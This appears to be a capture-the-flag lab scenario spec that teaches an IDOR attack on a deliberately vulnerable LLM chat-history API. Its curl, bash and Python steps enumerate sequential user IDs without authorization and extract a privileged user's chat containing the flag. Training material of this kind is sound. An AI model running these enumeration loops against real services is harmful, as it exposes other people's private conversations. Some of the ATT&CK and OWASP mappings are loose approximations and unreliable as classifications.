  LLM-03 scenario header block:
  ```
  ### LLM-03: IDOR in LLM Chat History API

  **VMs:** Attacker (Kali), LLM Server (Ubuntu 22.04, Ollama + Damn Vulnerable LLM Agent)
  **Difficulty:** Medium
  **Flags:** 1
  ```
  Narrative (two sentences): The LLM application exposes a chat history endpoint that
  retrieves conversation records by integer user ID — but performs no ownership check
  to verify the requesting client owns that ID. The student enumerates sequential integer
  IDs on the unauthenticated endpoint to discover a privileged user's chat session
  containing an embedded flag.

  STAGES — 4 stages plus one [FLAG 1] stage:

  STAGE 1: "API Endpoint Discovery"
  - Action: You enumerate the LLM application's API surface to locate the chat history
    endpoint and confirm it accepts unauthenticated requests.
  - Command:
    First: `curl -s http://LLM_SERVER_IP:PORT/ | jq .` to discover routes.
    Then: `curl -v http://LLM_SERVER_IP:PORT/history/1` to probe the history endpoint
    with user_id=1 and confirm it returns data without requiring an Authorization header.
  - Expected Output: HTTP 200 with a JSON chat history for user 1 (e.g.,
    `{"user_id": 1, "messages": [{"role": "user", "content": "Hello"}, ...]}`).
    No `401 Unauthorized` or `403 Forbidden` response — confirming the endpoint is
    unauthenticated.
  - TTP: `[T1592 — Gather Victim Host Information](https://attack.mitre.org/techniques/T1592/) · Reconnaissance`

  STAGE 2: "Ownership Model Verification — No Auth Check"
  - Action: You confirm the endpoint has no user ID ownership enforcement by accessing
    a different user's chat history without any session token or credential.
  - Command:
    `# Test user_id=2 — if response is not 401/403, IDOR is confirmed`
    `curl -s http://LLM_SERVER_IP:PORT/history/2 | jq .`
    `# Compare: access your own ID vs. another ID — both return 200`
    `curl -s http://LLM_SERVER_IP:PORT/history/YOUR_USER_ID | jq .`
  - Expected Output: HTTP 200 for both requests. Both return chat histories for different
    users — no authorization error. This confirms sequential integer IDOR vulnerability.
  - TTP: `[T1078 — Valid Accounts](https://attack.mitre.org/techniques/T1078/) · Defense Evasion`
    Note: OWASP API Security Top 10 maps this to API1 (Broken Object Level Authorization);
    OWASP LLM Top 10 2025 maps it to LLM10 (Unbounded Consumption / API misuse). Cite:
    `[LLM10 — Unbounded Consumption](https://owasp.org/www-project-top-10-for-large-language-model-applications/) · OWASP LLM Top 10 2025`

  STAGE 3: "Sequential ID Enumeration — Bruteforce Chat History"
  - Action: You iterate over sequential integer user IDs to enumerate all accessible chat
    histories, looking for sessions belonging to privileged users that contain the flag.
  - Command — show two approaches:
    Primary (Python loop, student authors):
    ```python
    import requests

    BASE_URL = "http://LLM_SERVER_IP:PORT/history"
    for uid in range(1, 50):
        r = requests.get(f"{BASE_URL}/{uid}")
        if r.status_code == 200:
            body = r.json()
            print(f"[+] user_id={uid}: {str(body)[:120]}")
    ```
    Alternative (bash loop):
    `for i in $(seq 1 50); do`
    `  echo -n "user_id=$i: ";`
    `  curl -s http://LLM_SERVER_IP:PORT/history/$i | jq -r '.messages[-1].content // "empty"';`
    `done`
  - Expected Output: A list of user IDs with their last message preview. One entry —
    belonging to a privileged user (e.g., user_id=7 or admin) — shows a message
    containing `CTF{` in the content field.
  - TTP: `[T1110.003 — Password Spraying](https://attack.mitre.org/techniques/T1110/003/) · Credential Access`
    Note: closest ATT&CK analog for sequential enumeration; primary classification is
    OWASP API1 (Broken Object Level Authorization) / LLM10.

  STAGE 4: "Targeted Record Retrieval — Privileged User Session"
  - Action: You retrieve the full chat history for the privileged user ID identified
    during enumeration, extracting the complete conversation that contains the embedded flag.
  - Command:
    `curl -s http://LLM_SERVER_IP:PORT/history/PRIVILEGED_USER_ID | jq .`
    Then to extract the flag string directly:
    `curl -s http://LLM_SERVER_IP:PORT/history/PRIVILEGED_USER_ID \`
    `  | jq -r '.messages[].content' \`
    `  | grep -o 'CTF{[^}]*}'`
  - Expected Output: Full JSON chat history for the privileged user, with the flag
    string visible in one of the message content fields.
  - TTP: `[T1530 — Data from Cloud Storage](https://attack.mitre.org/techniques/T1530/) · Collection`
    Note: closest ATT&CK mapping for data exfiltration from a cloud-adjacent API store.

  [FLAG 1] STAGE 5: "Flag Capture — Privileged User Chat Session"
  - Use §1.2 format: `### [FLAG 1] Stage 5: Flag Capture — Privileged User Chat Session`
  - Action: You retrieve Flag 1 from the privileged user's chat history record exposed
    by the unauthenticated IDOR endpoint.
  - Command:
    `curl -s http://LLM_SERVER_IP:PORT/history/PRIVILEGED_USER_ID \`
    `  | jq -r '.messages[].content' \`
    `  | grep -o 'CTF{[^}]*}'`
  - Expected Output: `CTF{...flag_value_placeholder...}`
  - TTP: `—` (flag capture, not an adversarial technique)
  </action>
